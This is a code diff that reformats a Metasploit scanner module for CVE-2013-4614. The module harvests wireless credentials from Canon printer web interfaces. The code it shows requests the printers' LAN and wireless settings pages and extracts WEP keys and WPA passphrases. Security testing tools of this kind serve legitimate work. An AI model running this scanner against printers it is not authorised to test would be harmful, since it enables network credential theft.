@@ -10,32 +10,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Canon Printer Wireless Configuration Disclosure',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Canon Printer Wireless Configuration Disclosure',
+        'Description' => %q{
           This module enumerates wireless credentials from Canon printers with a web interface.
           It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870,
           MX890, MX920.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Matt "hostess" Andreko <mandreko[at]accuvant.com>'
         ],
-      'References'     => [
-        [ 'CVE', '2013-4614' ],
-        [ 'OSVDB', '94417' ],
-        [ 'URL', 'https://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
-      ],
-      'DisclosureDate' => '2013-06-18'))
+        'References' => [
+          [ 'CVE', '2013-4614' ],
+          [ 'OSVDB', '94417' ],
+          [ 'URL', 'https://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
+        ],
+        'DisclosureDate' => '2013-06-18',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
   end
 
   def get_network_settings
     begin
       res = send_request_cgi({
         'method' => 'GET',
-        'uri'    => '/English/pages_MacUS/lan_set_content.html',
+        'uri' => '/English/pages_MacUS/lan_set_content.html',
       })
     rescue
       print_error("#{rhost}:#{rport} Could not connect.")
@@ -81,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi({
         'method' => 'GET',
-        'uri'    => "/English/pages_MacUS/wls_set_content.html",
+        'uri' => "/English/pages_MacUS/wls_set_content.html",
       })
     rescue
       print_error("#{ip}:#{rport} Could not connect.")
@@ -101,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
         when '1'
           encryption_setting = 'WEP'
           wep_key_inputs = html.xpath '//input[starts-with(@name, "WLS_TXT1") and not(@value="")]'
-          encryption_key = wep_key_inputs.collect{|x| x['value']}.join(', ')
+          encryption_key = wep_key_inputs.collect { |x| x['value'] }.join(', ')
         when '2'
           encryption_setting = 'WPA'
           wpa_key_input = html.xpath '//input[@name="WLS_TXT2"]'
@@ -123,7 +131,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     ns = get_network_settings
     return if ns.nil?
 
@@ -151,6 +158,5 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     print_good good_string
-
   end
 end
